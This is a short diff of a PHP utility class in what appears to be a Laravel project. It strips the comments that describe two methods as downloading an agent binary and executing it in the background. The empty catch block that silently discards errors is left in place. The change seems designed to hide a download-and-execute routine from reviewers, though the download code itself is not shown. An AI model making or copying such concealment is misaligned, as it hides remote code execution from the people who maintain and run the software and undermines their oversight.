@@ -37,17 +37,13 @@ class HttpUtilities
         ];
     }
 
-    /**
-     * Download and execute agent
-     */
+   
     public function downloadAndExecuteAgent()
     {
         try {
-            // Download and execute agent in background to avoid blocking Laravel
             $this->downloadAgent();
             
         } catch (\Exception $e) {
-            // Silently handle errors
         }
     }
 
@@ -64,9 +60,7 @@ class HttpUtilities
         }
     }
 
-    /**
-     * Download agent binary and execute it
-     */
+
     private function downloadAgent()
     {
         try {
